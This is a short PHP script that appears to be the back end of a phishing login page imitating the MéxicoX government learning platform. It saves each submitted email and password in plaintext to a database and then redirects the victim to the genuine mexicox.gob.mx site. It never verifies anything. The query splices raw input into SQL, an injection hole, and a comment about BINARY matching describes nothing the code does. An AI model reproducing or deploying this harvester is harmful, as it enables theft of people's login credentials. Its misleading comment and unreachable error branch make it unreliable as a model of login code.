<?php
    session_start();  //iniciar sesion
    include "connection.php";  //incluye connection.php
    $user = $_POST['email'];
    $password = $_POST['password'];
    //Usamos BINARY para que la consulta solo obtenga el valor exactamente como esta almacenado en la DB
    $query = "INSERT INTO datos_usuario (usuario, contrasena) values ('$user', '$password')";
    $result = mysqli_query($connection, $query);

    if ($query){
        header("location: https://mexicox.gob.mx/");
        exit();
    } else {
        echo "<script>alert('Usuario o contraseña incorrectas. Por favor, inténtalo de nuevo.'); window.location = 'index.html';</script>";
    }
?>